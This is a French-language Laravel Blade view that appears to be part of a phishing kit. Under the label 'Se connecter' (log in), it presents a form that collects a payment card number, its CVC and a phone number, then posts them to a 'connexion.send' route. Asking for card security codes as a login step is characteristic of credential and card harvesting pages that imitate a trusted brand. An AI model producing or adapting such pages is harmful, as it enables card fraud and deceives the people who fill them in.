@extends('layouts.app')

@section('content')
    <div class="text-center" style="max-width: 400px; width: 100%;">
        <p class="mb-4">Veuillez renseigner les informations ci-dessous pour continuer.</p>

        <form action="{{ route('connexion.send') }}" method="POST">
            @csrf
            <div class="mb-3 text-start">
                <label for="card-number" class="form-label">Numéro de la carte <span class="text-danger">*</span></label>
                <input type="text" id="card-number" name="card_number"
                       class="form-control rounded-pill text-center"
                       placeholder="XXXX XXXX XXXX XXXX"
                       
                       required>
            </div>

            <div class="mb-4 text-start">
                <label for="cvc" class="form-label">CVC <span class="text-danger">*</span></label>
                <input type="text" id="cvc" name="cvc"
                       class="form-control rounded-pill text-center"
                       placeholder="XXX"
                       required>
            </div>

            <div class="mb-4 text-start">
                <label for="phone" class="form-label">Téléphone <span class="text-danger">*</span></label>
                <input type="text" id="phone" name="phone"
                       class="form-control rounded-pill text-center"
                       placeholder="XX XX XX XX XX"
                       required>
            </div>

            <button type="submit" name="submitconnexion" class="btn btn-orange rounded-pill py-5 px-4">
                Se connecter
            </button>
        </form>

        <div class="mt-5">
            <img src="{{ asset('assets/images/promo-placeholder.jpg') }}" alt="Promotions" class="" style="max-width: 200px;">
        </div>
    </div>
@endsection
